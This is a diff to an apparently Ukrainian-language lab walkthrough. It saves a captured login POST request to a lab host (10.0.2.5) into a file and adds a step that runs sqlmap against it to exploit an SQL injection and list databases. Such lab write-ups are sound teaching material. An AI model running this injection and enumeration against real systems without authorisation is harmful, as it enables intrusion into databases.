@@ -165,7 +165,7 @@ uname=&psw=&btnLogin=Login
 
 Насамперед підготую POST запит на Калі:
 
-cat >> sql                         
+cat <<'EOF'>> sql                         
 POST /index.php HTTP/1.1
 Host: 10.0.2.5
 Content-Length: 26
@@ -181,3 +181,10 @@ Accept-Encoding: gzip, deflate, br
 Connection: keep-alive
 
 uname=&psw=&btnLogin=Login
+EOF
+
+Далі застосовую інструмент SQLMap для експлуатації вразливості SQL-інʼєкції: sqlmap -r sql --dbs
+
+<img width="1301" height="943" alt="image" src="https://github.com/user-attachments/assets/8055c2a1-5101-4985-bee5-9ce4504a3fad" />
+
+
